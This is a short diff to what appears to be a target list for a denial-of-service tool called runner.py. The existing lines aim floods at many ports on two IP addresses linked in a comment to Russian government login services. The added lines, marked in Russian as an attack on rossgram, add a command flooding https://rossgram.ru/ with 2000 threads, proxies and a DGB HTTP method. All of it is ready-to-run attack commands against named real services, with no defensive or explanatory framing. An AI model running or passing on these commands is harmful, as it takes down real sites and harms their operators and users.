@@ -10,3 +10,7 @@
 #https://esia.gosuslugi.ru и https://e-trust.gosuslugi.ru
 
 runner.py tcp://213.59.254.8:80 tcp://213.59.254.8:443 tcp://185.194.34.142:22 tcp://185.194.34.142:23 tcp://185.194.34.142:25 tcp://185.194.34.142:53 tcp://185.194.34.142:80 tcp://185.194.34.142:110 tcp://185.194.34.142:443 tcp://185.194.34.142:1433 -t 1000  --rpc 100  --debug
+
+# атака на помойку rossgram
+
+runner.py https://rossgram.ru/ -t 2000 -p 1200 --rpc 100 --http-methods DGB --debug
